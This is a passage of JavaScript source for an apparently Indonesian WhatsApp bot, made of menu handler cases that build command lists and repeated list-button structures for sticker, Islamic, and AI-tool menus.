        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'stickermenubutton': {
let teks =`◤─「 \`STICKER\` 」─✦
│⦿ 〔 _.goose_
│⦿ 〔 _.woof_
│⦿ 〔 _.8ball_
│⦿ 〔 _.lizard_
│⦿ 〔 _.meow_
│⦿ 〔 _.gura_
│⦿ 〔 _.doge_
│⦿ 〔 _.patrick_
│⦿ 〔 _.lovestick_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'databasemenubutton': {
let teks =`┏『 *\`乂 ɪ s ʟ ᴀ ᴍ ɪ - ᴍᴇɴᴜ 乂\`* 』━◧
║◦ *${prefix}kisahnabi*
║◦ *${prefix}asmaulhusna*
║◦ *${prefix}bacaansholat*
║◦ *${prefix}audiosurah*
║◦ *${prefix}ayatkursi*
║◦ *${prefix}doaharian*
║◦ *${prefix}niatsholat*
║◦ *${prefix}quotesislami*
║◦ *${prefix}doatahlil*
║◦ *${prefix}tafsir*
║◦ *${prefix}jadwalsholat*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'aimenubutton': {
   let teks =`◤─「 \`OPEN AI\` 」─✦
│⦿ 〔 _.leptonai_
│⦿ 〔 _.openai_
│⦿ 〔 _.ai_
│⦿ 〔 _.hutaoai_
│⦿ 〔 _.bard_
│⦿ 〔 _.prodia_
│⦿ 〔 _.diffusion-anime_
│⦿ 〔 _.travel-assistant_
│⦿ 〔 _.ocr_
│⦿ 〔 _.guru-ai_
│⦿ 〔 _.emi-ai_
│⦿ 〔 _.claude-ai_
│⦿ 〔 _.costume-ai_
│⦿ 〔 _.herc-ai_
│⦿ 〔 _.hercai-cartoon_
│⦿ 〔 _.hercai-animefy_
│⦿ 〔 _.hercai-lexica_
│⦿ 〔 _.hercai-prodia_
│⦿ 〔 _.hercai-simurg_
│⦿ 〔 _.hercai-raava_
│⦿ 〔 _.hercai-shonin_
│⦿ 〔 _.realistic_
│⦿ 〔 _.3dmodel_
│⦿ 〔 _.jadizombie_
│⦿ 〔 _.blackboxai_
│⦿ 〔 _.photoleapai_
│⦿ 〔 _.diffusion_
│⦿ 〔 _.indo-ai_
│⦿ 〔 _.lamaai_
│⦿ 〔 _.aivo_
│⦿ 〔 _.gemini_
│⦿ 〔 _.text2img_
│⦿ 〔 _.absolutely_
│⦿ 〔 _.dalle_
│⦿ 〔 _.bingimg_
│⦿ 〔 _.bingai_
│⦿ 〔 _.gptimg_
│⦿ 〔 _.gpt4_
│⦿ 〔 _.gpt4_2_
│⦿ 〔 _.anything_
│⦿ 〔 _.hdvid_
│⦿ 〔 _.cai_
│⦿ 〔 _.youai_
│⦿ 〔 _.remini_
│⦿ 〔 _.jadianime_
│⦿ 〔 _.removebg_
│⦿ 〔 _.nulis_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
